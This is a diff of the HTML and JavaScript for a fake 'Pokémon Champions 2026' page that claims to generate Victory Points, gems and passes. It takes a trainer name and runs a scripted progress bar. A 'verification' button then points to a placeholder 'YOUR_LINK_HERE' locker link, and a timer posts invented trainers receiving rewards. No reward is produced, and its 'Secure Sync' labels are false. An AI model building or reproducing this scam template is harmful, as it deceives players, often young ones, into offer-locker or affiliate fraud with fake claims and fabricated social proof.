@@ -3,301 +3,324 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pokémon Distribution Center - Official v4.2</title>
+    <title>Pokémon Champions 2026 - Global Resource Sync</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto:wght@300;500;900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;500;800&display=swap');
 
         :root {
-            --pkm-blue: #0075BE;
-            --pkm-yellow: #FFCB05;
-            --neon-blue: #00f2ff;
-            --dark-ui: #0a0e17;
+            --primary: #00f2ff;
+            --accent: #ff007a;
+            --gold: #ffcc00;
+            --glass-bg: rgba(10, 15, 30, 0.9);
+            --neon-shadow: 0 0 20px rgba(0, 242, 255, 0.4);
         }
 
         body {
-            background: #05070a;
+            background: #02050a;
             color: #fff;
-            font-family: 'Roboto', sans-serif;
+            font-family: 'Inter', sans-serif;
             margin: 0;
             padding: 0;
-            background: radial-gradient(circle at center, #0a1a2f 0%, #05070a 100%);
             overflow-x: hidden;
-        }
-
-        /* Overlay Background l-nadi */
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: url('https://upload.wikimedia.org/wikipedia/commons/3/3e/Tokyo_Skyline_at_Night_Blue_Hour.jpg');
+            /* Background stable mn Wikimedia */
+            background: linear-gradient(rgba(2, 5, 10, 0.85), rgba(2, 5, 10, 0.85)), 
+                        url('https://upload.wikimedia.org/wikipedia/commons/3/3e/Tokyo_Skyline_at_Night_Blue_Hour.jpg');
             background-size: cover;
-            opacity: 0.15;
-            z-index: -1;
+            background-attachment: fixed;
+            background-position: center;
         }
 
         nav {
-            background: rgba(0, 0, 0, 0.9);
-            padding: 10px 5%;
+            background: rgba(0,0,0,0.7);
+            padding: 15px 5%;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 3px solid var(--pkm-yellow);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+            border-bottom: 1px solid var(--primary);
+            backdrop-filter: blur(10px);
         }
 
-        .logo-nav { width: 140px; }
-
-        .status-pill {
-            background: rgba(46, 204, 113, 0.1);
-            border: 1px solid #2ecc71;
-            color: #2ecc71;
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 0.7rem;
-            font-weight: 900;
-            text-transform: uppercase;
-        }
+        .logo-nav { width: 120px; filter: drop-shadow(0 0 5px var(--primary)); }
 
         .container {
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 60px 20px;
+            padding: 40px 20px;
         }
 
-        .main-panel {
-            background: linear-gradient(145deg, #101622, #070a0f);
-            border: 1px solid rgba(255,255,255,0.05);
-            border-radius: 20px;
+        .main-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 30px;
             width: 100%;
-            max-width: 480px;
-            padding: 40px 30px;
-            box-shadow: 0 40px 100px rgba(0,0,0,0.8);
+            max-width: 500px;
+            padding: 40px;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.9), var(--neon-shadow);
             position: relative;
-            border-top: 4px solid var(--pkm-blue);
+            text-align: center;
+            box-sizing: border-box;
         }
 
-        .ver-tag {
+        .badge-pro {
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            font-size: 0.65rem;
+            padding: 6px 14px;
+            border-radius: 50px;
+            font-weight: 800;
+            text-transform: uppercase;
             position: absolute;
-            top: -15px;
+            top: 20px;
             right: 20px;
-            background: var(--pkm-yellow);
-            color: #000;
-            padding: 4px 15px;
-            border-radius: 5px;
-            font-size: 0.7rem;
-            font-weight: 900;
-            font-family: 'Orbitron';
+            letter-spacing: 1px;
+            box-shadow: 0 0 10px var(--accent);
         }
 
-        h2 { font-family: 'Orbitron'; text-transform: uppercase; color: var(--pkm-blue); margin-bottom: 30px; letter-spacing: 2px; }
+        h2, h3 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
 
-        .input-group { margin-bottom: 20px; text-align: left; }
-        label { display: block; font-size: 0.75rem; color: #666; margin-bottom: 8px; font-weight: 900; text-transform: uppercase; }
-
-        .input-field {
-            background: #05070a;
-            border: 1px solid #1a2436;
+        .input-ui {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid var(--primary);
+            border-radius: 12px;
             padding: 18px;
             width: 100%;
-            border-radius: 10px;
             color: #fff;
             font-size: 1rem;
+            margin-bottom: 15px;
             box-sizing: border-box;
+            outline: none;
             transition: 0.3s;
         }
-        .input-field:focus { border-color: var(--pkm-blue); outline: none; box-shadow: 0 0 15px rgba(0, 117, 190, 0.3); }
 
-        .rewards-grid {
+        .grid-rewards {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 15px;
-            margin: 25px 0;
+            margin: 20px 0;
         }
 
-        .card {
-            background: #161d2b;
-            border: 2px solid transparent;
-            border-radius: 15px;
+        .reward-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
             padding: 20px;
             cursor: pointer;
-            transition: 0.3s ease;
-            position: relative;
+            transition: 0.3s;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
-        .card:hover { transform: translateY(-5px); background: #1c2638; }
-        .card.active { border-color: var(--pkm-blue); background: rgba(0, 117, 190, 0.1); }
-
-        .card img { 
-            width: 70px; 
-            height: 70px; 
-            object-fit: contain; 
-            margin-bottom: 10px;
-            filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5));
+        .reward-card:hover, .reward-card.active {
+            border-color: var(--primary);
+            background: rgba(0, 242, 255, 0.1);
+            transform: translateY(-5px);
         }
 
-        .card b { display: block; font-size: 1.1rem; color: #fff; }
-        .card span { font-size: 0.7rem; color: var(--pkm-blue); font-weight: 900; text-transform: uppercase; }
+        .reward-card img { 
+            width: 60px; 
+            height: 60px;
+            object-fit: contain;
+            margin-bottom: 10px; 
+            animation: float 3s ease-in-out infinite;
+        }
 
-        .btn-pkm {
-            background: linear-gradient(to bottom, #0075BE, #005a92);
-            color: white;
-            border: none;
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+
+        .reward-card span { display: block; font-weight: 900; font-size: 1.2rem; color: #fff; }
+        .reward-card small { color: var(--primary); font-size: 0.75rem; font-weight: bold; }
+
+        .btn-action {
+            background: linear-gradient(to right, var(--primary), #00a2ff);
+            color: #000;
             width: 100%;
             padding: 20px;
-            border-radius: 12px;
-            font-family: 'Orbitron';
+            border: none;
+            border-radius: 15px;
             font-weight: 900;
-            font-size: 1.1rem;
+            font-size: 1.2rem;
             cursor: pointer;
-            box-shadow: 0 10px 20px rgba(0, 117, 190, 0.4);
-            transition: 0.2s;
             text-transform: uppercase;
+            box-shadow: 0 10px 25px rgba(0, 242, 255, 0.4);
+            transition: 0.3s;
+            font-family: 'Orbitron', sans-serif;
         }
-        .btn-pkm:active { transform: scale(0.98); }
 
-        .loader-box { padding: 40px 0; }
-        .pkm-loader {
-            width: 60px; height: 60px;
-            border: 6px solid #101622;
-            border-top: 6px solid var(--pkm-yellow);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+        .btn-action:hover { transform: scale(1.03); }
+
+        .activity-feed {
+            margin-top: 25px;
+            padding: 12px;
+            background: rgba(0,0,0,0.4);
+            border-radius: 50px;
+            font-size: 0.8rem;
+            color: #00f2ff;
+            border: 1px solid rgba(0,242,255,0.1);
         }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
 
         .hidden { display: none; }
 
-        .live-bar {
-            margin-top: 30px;
-            background: rgba(0,0,0,0.5);
-            padding: 12px 20px;
-            border-radius: 10px;
-            font-size: 0.8rem;
-            border-left: 4px solid var(--pkm-yellow);
+        .loader {
+            width: 60px; height: 60px; border: 4px solid #111; border-top: 4px solid var(--primary);
+            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;
         }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        .characters-showcase {
+            margin-top: 40px;
+            display: flex;
+            gap: 15px;
+            overflow-x: auto;
+            width: 100%;
+            max-width: 500px;
+            padding-bottom: 10px;
+        }
+
+        .char-item {
+            min-width: 100px;
+            text-align: center;
+            background: var(--glass-bg);
+            border-radius: 15px;
+            padding: 10px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .char-item img { width: 100%; border-radius: 10px; min-height: 80px; object-fit: contain; }
+        .char-item p { font-size: 0.65rem; font-weight: bold; margin-top: 5px; color: var(--gold); }
     </style>
 </head>
 <body>
 
 <nav>
     <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/International_Pok%C3%A9mon_logo.svg" class="logo-nav">
-    <div class="status-pill">● Secure Sync</div>
+    <div style="font-size: 0.7rem; text-align: right;">
+        <span style="color: #2ecc71;">● SYNC ACTIVE</span><br>
+        <span style="color: #aaa;">2026 EDITION</span>
+    </div>
 </nav>
 
 <div class="container">
-    <div class="main-panel">
-        <div class="ver-tag">OFFICIAL DISTRIBUTOR</div>
-
-        <div id="step1">
-            <h2>Account Sync</h2>
-            <div class="input-group">
-                <label>Trainer Username</label>
-                <input type="text" id="username" class="input-field" placeholder="Enter Trainer ID...">
-            </div>
-            <div class="input-group">
-                <label>Select Region</label>
-                <select class="input-field">
-                    <option>Global (North America / Europe)</option>
-                    <option>Asia (Japan / Korea)</option>
-                </select>
-            </div>
-            <button class="btn-pkm" onclick="goStep2()">Initialize Connection</button>
+    <div class="main-card">
+        <div class="badge-pro">v4.2 Secured</div>
+        
+        <div id="ui-step1">
+            <h2 style="margin-top: 40px; color: var(--primary);">Global Distribution</h2>
+            <p style="color: #aaa; font-size: 0.85rem; margin-bottom: 25px;">Enter Trainer Username to Begin</p>
+            <input type="text" class="input-ui" id="trainer-name" placeholder="Trainer Name...">
+            <select class="input-ui">
+                <option>iOS / Android</option>
+                <option>Nintendo Switch</option>
+            </select>
+            <button class="btn-action" onclick="toStep2()">Secure Connection</button>
         </div>
 
-        <div id="step2" class="hidden">
-            <h2 style="font-size: 1.2rem;">Select Asset Pack</h2>
-            <div class="rewards-grid">
-                <div class="card active" onclick="sel(this, '50,000 VP')">
+        <div id="ui-step2" class="hidden">
+            <h3 style="margin-bottom: 20px; font-size: 1rem;">Select Resources</h3>
+            <div class="grid-rewards">
+                <div class="reward-card active" onclick="selectReward(this, '50,000 VP')">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Pok%C3%A9_Ball_icon.svg">
-                    <b>50,000</b>
-                    <span>Victory Points</span>
+                    <span>50,000</span>
+                    <small>Victory Points</small>
                 </div>
-                <div class="card" onclick="sel(this, '10,000 Gems')">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/1/1e/Master_Ball_icon.svg">
-                    <b>10,000</b>
-                    <span>Premium Gems</span>
+                <div class="reward-card" onclick="selectReward(this, '10,000 Gems')">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/23/Diamond_icon_flat.svg">
+                    <span>10,000</span>
+                    <small>Champion Gems</small>
                 </div>
-                <div class="card" onclick="sel(this, 'Elite Pass')">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d4/Ticket_font_awesome.svg/512px-Ticket_font_awesome.svg.png" style="filter: invert(34%) sepia(87%) saturate(2256%) hue-rotate(185deg) brightness(97%) contrast(101%);">
-                    <b>S12</b>
-                    <span>Season Pass</span>
+                <div class="reward-card" onclick="selectReward(this, 'Elite Pass')">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/47/Ticket_font_awesome_blue.svg" style="filter: hue-rotate(140deg);">
+                    <span>S12</span>
+                    <small>Elite Pass</small>
                 </div>
-                <div class="card" onclick="sel(this, 'Omni Stone')">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/29/Gold_Star.svg/512px-Gold_Star.svg.png">
-                    <b>OMNI</b>
-                    <span>Rare Stone</span>
+                <div class="reward-card" onclick="selectReward(this, 'Omni Stone')">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/Five_pointed_star.svg" style="filter: drop-shadow(0 0 5px #ffcc00);">
+                    <span>OMNI</span>
+                    <small>Evolution Stone</small>
                 </div>
             </div>
-            <button class="btn-pkm" onclick="goStep3()">Confirm Distribution</button>
+            <button class="btn-action" onclick="toStep3()">Initiate Generator</button>
         </div>
 
-        <div id="step3" class="hidden loader-box">
-            <div class="pkm-loader"></div>
-            <p id="load-text" style="font-family: 'Orbitron'; font-size: 0.8rem; color: var(--pkm-blue);">Accessing Server...</p>
-            <div style="width:100%; background:#05070a; height:6px; border-radius:10px; margin-top:20px;">
-                <div id="bar" style="width:0%; height:100%; background:var(--pkm-blue); box-shadow: 0 0 10px var(--pkm-blue); transition: 0.3s;"></div>
-            </div>
-        </div>
-
-        <div id="step4" class="hidden">
-            <h2 style="color: var(--pkm-yellow);">Action Required</h2>
-            <p style="font-size: 0.85rem; line-height: 1.6; color: #ccc;">To finalize the distribution of <b id="final-res" style="color:var(--pkm-blue)">Assets</b> to your trainer ID, please complete the secure human verification.</p>
-            
-            <div style="background: rgba(0,0,0,0.3); padding: 25px; border-radius: 15px; border: 1px solid #1a2436; margin: 25px 0;">
-                <i class="fas fa-user-check" style="font-size: 2.5rem; color: var(--pkm-yellow); margin-bottom: 15px;"></i>
-                <p style="font-size: 0.8rem; font-weight: 900;">SECURE GATEWAY v4.2</p>
-                <button class="btn-pkm" style="margin-top: 15px;" onclick="window.location.href='YOUR_LINK_HERE'">Verify Identity</button>
+        <div id="ui-sync" class="hidden" style="padding: 40px 0;">
+            <div class="loader"></div>
+            <h4 id="status-text" style="color: var(--primary); font-family: 'Orbitron';">Connecting...</h4>
+            <div style="width: 100%; background: #111; height: 8px; border-radius: 10px; overflow: hidden; margin-top: 20px;">
+                <div id="progress-bar" style="width: 0%; height: 100%; background: var(--primary); transition: 0.3s;"></div>
             </div>
         </div>
 
-        <div class="live-bar">
-            <i class="fas fa-wifi" style="color: #2ecc71;"></i> <span id="log">Gateway ready for distribution...</span>
+        <div id="ui-locker" class="hidden">
+            <h3 style="color: var(--accent);">Manual Verification</h3>
+            <p style="font-size: 0.85rem; color: #ccc; margin-bottom: 20px;">Resource: <span id="summary-res" style="color: var(--primary);">...</span></p>
+            <div style="background: rgba(0, 242, 255, 0.05); padding: 30px; border: 2px dashed var(--primary); border-radius: 20px; margin-bottom: 15px;">
+                <p style="font-weight: bold; font-size: 0.9rem; margin-bottom: 15px;">Bot Protection Active</p>
+                <button class="btn-action" onclick="window.location.href='YOUR_LINK_HERE'">Verify Now</button>
+            </div>
+        </div>
+
+        <div class="activity-feed">
+            <i class="fas fa-bolt"></i> <span id="live-text">Waiting for trainer...</span>
+        </div>
+    </div>
+
+    <h3 style="margin-top: 40px; font-size: 0.8rem; color: #555;">TRENDING SEASON 12</h3>
+    <div class="characters-showcase">
+        <div class="char-item">
+            <img src="https://upload.wikimedia.org/wikipedia/en/3/39/Pok%C3%A9mon_Charizard_art.png" alt="Pika">
+            <p>CHARIZARD</p>
+        </div>
+        <div class="char-item">
+            <img src="https://upload.wikimedia.org/wikipedia/en/a/a6/Pok%C3%A9mon_Pikachu_art.png" alt="Pika">
+            <p>PIKACHU</p>
+        </div>
+        <div class="char-item">
+            <img src="https://upload.wikimedia.org/wikipedia/en/5/5e/Pok%C3%A9mon_Lucario_art.png" alt="Lucario">
+            <p>LUCARIO</p>
         </div>
     </div>
 </div>
 
 <script>
-    let choice = "50,000 VP";
+    let selectedItem = "50,000 VP";
 
-    function goStep2() {
-        if(document.getElementById('username').value.length < 3) return alert('Enter valid Trainer ID');
-        document.getElementById('step1').classList.add('hidden');
-        document.getElementById('step2').classList.remove('hidden');
+    function toStep2() {
+        if(document.getElementById('trainer-name').value.length < 3) return alert('Enter a valid name');
+        document.getElementById('ui-step1').classList.add('hidden');
+        document.getElementById('ui-step2').classList.remove('hidden');
     }
 
-    function sel(el, val) {
-        document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
+    function selectReward(el, name) {
+        document.querySelectorAll('.reward-card').forEach(r => r.classList.remove('active'));
         el.classList.add('active');
-        choice = val;
+        selectedItem = name;
     }
 
-    function goStep3() {
-        document.getElementById('step2').classList.add('hidden');
-        document.getElementById('step3').classList.remove('hidden');
-        document.getElementById('final-res').innerText = choice;
-        
-        let p = 0;
-        const txt = ['Connecting...', 'Searching ID...', 'Generating Packets...', 'Finalizing Sync...'];
-        const timer = setInterval(() => {
-            p += 5;
-            document.getElementById('bar').style.width = p + '%';
-            document.getElementById('load-text').innerText = txt[Math.floor(p/26)] || 'Ready!';
-            if(p >= 100) {
-                clearInterval(timer);
-                document.getElementById('step3').classList.add('hidden');
-                document.getElementById('step4').classList.remove('hidden');
+    function toStep3() {
+        document.getElementById('ui-step2').classList.add('hidden');
+        document.getElementById('ui-sync').classList.remove('hidden');
+        document.getElementById('summary-res').innerText = selectedItem;
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += 5;
+            document.getElementById('progress-bar').style.width = progress + '%';
+            if(progress >= 100) {
+                clearInterval(interval);
+                document.getElementById('ui-sync').classList.add('hidden');
+                document.getElementById('ui-locker').classList.remove('hidden');
             }
-        }, 150);
+        }, 120);
     }
 
     setInterval(() => {
-        const users = ['Ash_K26', 'Elite_Trainer', 'ProMaster', 'Shadow_PKM'];
-        const r = ['50,000 VP', '10,000 Gems', 'Elite Pass'];
-        document.getElementById('log').innerText = `Trainer ${users[Math.floor(Math.random()*4)]} received ${r[Math.floor(Math.random()*3)]}`;
-    }, 5000);
+        const trainers = ['X_Slayer_USA', 'PokeGod_26', 'Sarah_Elite', 'Daniel_Pro'];
+        const t = trainers[Math.floor(Math.random()*trainers.length)];
+        document.getElementById('live-text').innerText = `Trainer \`${t}\` syncing assets...`;
+    }, 4000);
 </script>
 
 </body>
